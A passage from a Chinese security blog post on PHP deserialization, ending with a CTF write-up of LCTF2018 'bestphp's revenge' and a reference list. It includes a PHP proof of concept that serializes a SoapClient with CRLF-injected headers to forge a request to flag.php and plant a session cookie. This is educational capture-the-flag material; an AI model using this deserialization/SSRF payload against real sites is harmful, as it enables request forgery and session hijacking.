<li>同时我们可以传入<code>name=SoapClient</code>，那么最后<code>call_user_func($b, $a)</code>就变成<code>call_user_func(array(&#39;SoapClient&#39;,&#39;welcome_to_the_lctf2018&#39;))</code>,即<code>call_user_func(SoapClient-&gt;welcome_to_the_lctf2018)</code>，由于<code>SoapClient</code>类中没有<code>welcome_to_the_lctf2018</code>这个方法，就会调用魔术方法<code>__call()</code>从而发送请求。</li>
<li>发送请求也就是去访问flag.php，并将结果保存在cookie为第二步我们规定的session_id的文件中。</li>
<li>再用这个session访问主页，就会<code>var_dump</code>session文件的内容，其中就包含字段名为<code>flag</code>的值。</li>
</ol>
<p>先构造POC：</p>
<div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-variable">$target</span> = <span class="hljs-string">&quot;http://127.0.0.1/flag.php&quot;</span>;
<span class="hljs-variable">$attack</span> = <span class="hljs-keyword">new</span> SoapClient(<span class="hljs-literal">null</span>,<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;location&#x27;</span> =&gt; <span class="hljs-variable">$target</span>,
    <span class="hljs-string">&#x27;user_agent&#x27;</span> =&gt; <span class="hljs-string">&quot;N0rth3ty\r\nCookie: PHPSESSID=tcjr6nadpk3md7jbgioa6elfk4\r\n&quot;</span>,
    <span class="hljs-string">&#x27;uri&#x27;</span> =&gt; <span class="hljs-string">&quot;123&quot;</span>));
<span class="hljs-variable">$payload</span> = urlencode(serialize(<span class="hljs-variable">$attack</span>));
<span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;|&#x27;</span>.<span class="hljs-variable">$payload</span>;</code></pre></div>

<p>这个poc就是利用crlf伪造请求去访问flag.php并将结果保存在cookie为<code>PHPSESSID=tcjr6nadpk3md7jbgioa6elfk4</code>的session中。</p>
<p>再注入反序列化的字符串：</p>
<p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/20200623152347.png" alt="img"></p>
<p>接着触发<code>SoapClient</code>的<code>__call</code>方法发送请求：</p>
<p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/20200623152825.png" alt="img"></p>
<p>更改cookie访问：</p>
<p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/20200623152931.png" alt="img"></p>
<h4 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h4><p>这道题卡了我一天的时间，还是一个签到题。。。。有一个问题一直困扰我，就是把POC生成的字符串写到session文件后，他是什么时候把session的文件内容给反序列化出来了。后来看了一篇文章才知道：</p>
<p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/20200623153337.png" alt="img"></p>
<p>于是就反序列化了一个<code>SoapClient</code>的实例，再调用<code>__call</code>函数的时候就会通过这个实例发送请求。</p>
<h1 id="转载与参考链接"><a href="#转载与参考链接" class="headerlink" title="转载与参考链接"></a>转载与参考链接</h1><ul>
<li><a target="_blank" rel="noopener" href="https://www.neatstudio.com/show-161-1.shtml">PHP 序列化（serialize）格式详解</a></li>
<li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/3674">PHP反序列化由浅入深</a></li>
<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/Wanghaoran-s1mple/p/13160708.html">借安恒月赛web pop对象注入+反序列化字符逃逸深究其逃逸原理</a></li>
<li><a target="_blank" rel="noopener" href="http://redteam.today/2017/10/01/POP%E9%93%BE%E5%AD%A6%E4%B9%A0/">POP链学习</a></li>
<li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/3336#toc-2">从LCTF WEB签到题看PHP反序列化</a></li>
<li><a target="_blank" rel="noopener" href="https://www.smi1e.top/lctf2018-bestphps-revenge-%E8%AF%A6%E7%BB%86%E9%A2%98%E8%A7%A3/">LCTF2018-bestphp’s revenge 详细题解</a></li>
<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/iamstudy/articles/unserialize_in_php_inner_class.html">反序列化之PHP原生类的利用</a></li>
<li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/3341#toc-13">LCTF 2018 Writeup – Nu1L</a></li>
<li><a target="_blank" rel="noopener" href="https://xi4or0uji.github.io/2019/06/27/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%94%B1%E6%B5%85%E5%88%B0%E6%B7%B1/#%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%BA%8F%E5%88%97%E5%8C%96%E9%97%AE%E9%A2%98">php反序列化由浅到深</a></li>
<li><a target="_blank" rel="noopener" href="https://0day.design/2019/03/05/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%88%A9%E7%94%A8/">php反序列化原生类利用</a></li>
<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/tr1ple/p/10188308.html">PHP SECURITY CALENDAR 2017 学习总结-更新中</a></li>
<li><a target="_blank" rel="noopener" href="https://medium.com/@Wh0ale/php-audit-labs-day3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-27834dcc3558">PHP-Audit-Labs — Day3 反序列化</a></li>
<li><a target="_blank" rel="noopener" href="https://segmentfault.com/a/1190000009742195">(转)详解spl_autoload_register()函数</a></li>
<li><a target="_blank" rel="noopener" href="https://ca0y1h.top/Web_security/php_related/5.PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0-%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%88%A9%E7%94%A8/">从两道CTF题目学习PHP原生类反序列化利用</a></li>
<li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/5450">从0到1掌握反序列化工具之PHPGGC</a></li>
<li><a target="_blank" rel="noopener" href="http://127.0.0.1/html/index.html">Web安全学习笔记</a></li>
<li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7570#toc-5">从CTF中学习PHP反序列化的各种利用方式</a></li>
<li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/8082#toc-13">怎样挖掘出属于自己的php反序列化链</a></li>
<li><a target="_blank" rel="noopener" href="http://vlambda.com/wz_1cLwVzfPSC.html">实战工具：PHPGGC详解</a></li>
<li><a target="_blank" rel="noopener" href="https://paper.seebug.org/1267/">从反序列化到类型混淆漏洞——记一次 ecshop 实例利用</a></li>
<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/20175211lyz/p/13633840.html">DDCTF 2020</a></li>
<li><a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/202819.html">利用session.upload_progress进行文件包含和反序列化渗透</a></li>
</ul>

            </div>
            <hr>
            <div>
              <div class="post-metas mb-3">
                
                  <div class="post-meta mr-3">
                    <i class="iconfont icon-category"></i>
                    
                      <a class="hover-with-bg" href="/categories/ctf/">ctf</a>
                    
                      <a class="hover-with-bg" href="/categories/web%E5%AE%89%E5%85%A8/">web安全</a>
                    
                      <a class="hover-with-bg" href="/categories/web%E5%AE%89%E5%85%A8/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">php反序列化漏洞</a>
                    
                      <a class="hover-with-bg" href="/categories/ctf/%E5%BC%BA%E7%BD%91%E6%9D%AF/">强网杯</a>
                    
                      <a class="hover-with-bg" href="/categories/ctf/%E5%BC%BA%E7%BD%91%E6%9D%AF/web%E8%BE%85%E5%8A%A9/">web辅助</a>
                    
                      <a class="hover-with-bg" href="/categories/ctf/0ctf2016/">0ctf2016</a>
                    
                      <a class="hover-with-bg" href="/categories/ctf/0ctf2016/piapiapia/">piapiapia</a>
                    
                      <a class="hover-with-bg" href="/categories/ctf/%E5%AE%89%E6%81%92%E6%9C%88%E8%B5%9B/">安恒月赛</a>
                    
                      <a class="hover-with-bg" href="/categories/ctf/%E5%AE%89%E6%81%92%E6%9C%88%E8%B5%9B/basic/">basic</a>
                    
                      <a class="hover-with-bg" href="/categories/ctf/CISCN2020/">CISCN2020</a>
                    
                      <a class="hover-with-bg" href="/categories/ctf/CISCN2020/babyunserialize/">babyunserialize</a>
                    
                      <a class="hover-with-bg" href="/categories/ctf/BJDCTF-2rd/">BJDCTF 2rd</a>
                    
                      <a class="hover-with-bg" href="/categories/ctf/BJDCTF-2rd/XSS%E4%B9%8B%E5%85%89/">XSS之光</a>
                    
                      <a class="hover-with-bg" href="/categories/ctf/SUCTF-2019/">SUCTF 2019</a>
                    
                      <a class="hover-with-bg" href="/categories/ctf/SUCTF-2019/uploads-2/">uploads 2</a>
                    
                      <a class="hover-with-bg" href="/categories/ctf/ddctf-2020/">ddctf 2020</a>
                    
                      <a class="hover-with-bg" href="/categories/ctf/ddctf-2020/Overwrite-Me/">Overwrite Me</a>
                    
                      <a class="hover-with-bg" href="/categories/ctf/LCTF2018/">LCTF2018</a>
                    
                      <a class="hover-with-bg" href="/categories/ctf/LCTF2018/Bestphp%E2%80%99s-revenge/">Bestphp’s revenge</a>
                    
                      <a class="hover-with-bg" href="/categories/ctf/Jarvisoj-Web/">Jarvisoj Web</a>
                    
                  </div>
                
                
                  <div class="post-meta">
                    <i class="iconfont icon-tags"></i>
                    
                      <a class="hover-with-bg" href="/tags/web%E5%AE%89%E5%85%A8/">web安全</a>
                    
                      <a class="hover-with-bg" href="/tags/ctf/">ctf</a>
                    
                      <a class="hover-with-bg" href="/tags/php/">php</a>
                    
                      <a class="hover-with-bg" href="/tags/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">php反序列化漏洞</a>
                    
                      <a class="hover-with-bg" href="/tags/phpggc/">phpggc</a>
                    
                  </div>
                
              </div>
              
                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
              
              
                <div class="post-prevnext">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2020/09/27/php%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E5%BC%80%E5%8F%91%E5%B1%9E%E4%BA%8E%E8%87%AA%E5%B7%B1%E7%9A%84php%E6%A1%86%E6%9E%B6/">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">php从零开始开发属于自己的php框架</span>
                        <span class="visible-mobile">上一篇</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2020/09/20/jwt-%E5%AE%89%E5%85%A8/">
                        <span class="hidden-mobile">jwt 安全</span>
                        <span class="visible-mobile">下一篇</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
              <!-- Comments -->
              <article class="comments" id="comments">
                
                
  <div class="disqus" style="width:100%">
    <div id="disqus_thread"></div>
    <script type="text/javascript">
      var disqus_config = function() {
        this.page.url = 'https://greydr34d.github.io/2020/09/20/php-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/';
        this.page.identifier = '/2020/09/20/php-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/';
      };
      Fluid.utils.waitElementVisible('disqus_thread', function () {
        var d = document, s = d.createElement('script');
        s.src = '//' + '' + '.disqus.com/embed.js';
        s.setAttribute('data-timestamp', new Date());
        (d.head || d.body).appendChild(s);
      });
    </script>
    <noscript>Please enable JavaScript to view the
      <a target="_blank" href="https://disqus.com/?ref_noscript" rel="nofollow noopener noopener">comments powered by Disqus.</a>
    </noscript>
  </div>


              </article>
            
          </article>
        </div>
      </div>
    </div>
    
      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
        <div id="toc">
  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
  <div class="toc-body" id="toc-body"></div>
</div>

      </div>
    
  </div>
</div>

<!-- Custom -->


    

    
      <a id="scroll-top-button" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v"
                 for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>
    

    
  </main>

  <footer class="text-center mt-5 py-3">
  <div class="footer-content">
     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
  </div>
  

  

  
</footer>

<!-- SCRIPTS -->

  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js" ></script>
<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.min.js" ></script>
<script  src="/js/debouncer.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>

<!-- Plugins -->




  



  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.0/dist/tocbot.min.js" ></script>



  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>



  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.0/anchor.min.js" ></script>



  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.6/dist/clipboard.min.js" ></script>






  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.11/lib/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var title = document.getElementById('subtitle').title;
      
      typing(title)
      
    })(window, document);
  </script>



  <script  src="/js/local-search.js" ></script>
  <script>
    (function () {
      var path = "/local-search.xml";
      var inputArea = document.querySelector("#local-search-input");
      inputArea.onclick = function () {
        searchFunc(path, 'local-search-input', 'local-search-result');
        this.onclick = null
      }
    })()
  </script>















<!-- 主题的启动项 保持在最底部 -->
<script  src="/js/boot.js" ></script>



</body>
</html>
